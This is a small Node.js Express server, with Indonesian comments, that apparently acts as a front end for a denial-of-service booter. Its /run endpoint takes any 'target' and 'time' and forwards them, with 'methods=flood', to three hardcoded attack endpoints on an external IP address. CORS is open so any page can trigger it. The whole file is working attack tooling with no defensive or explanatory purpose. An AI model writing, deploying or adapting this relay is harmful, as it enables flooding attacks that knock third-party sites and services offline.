const express = require("express");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

// endpoint lo
const endpoints = [
  "http://178.128.95.130:2159/permen",
  "http://178.128.95.130:2281/permen",
  "http://178.128.95.130:2261/permen"
];

// enable CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  next();
});

app.get("/run", async (req, res) => {
  const { target, time } = req.query;

  if (!target || !time) {
    return res.status(400).json({
      error: "target & time wajib diisi"
    });
  }

  try {
    const urls = endpoints.map(base =>
      `${base}?target=${encodeURIComponent(target)}&time=${time}&methods=flood`
    );

    const responses = await Promise.all(urls.map(url => fetch(url)));
    const results = await Promise.all(responses.map(r => r.text()));

    res.json({
      success: true,
      results
    });

  } catch (err) {
    res.status(500).json({
      error: err.toString()
    });
  }
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
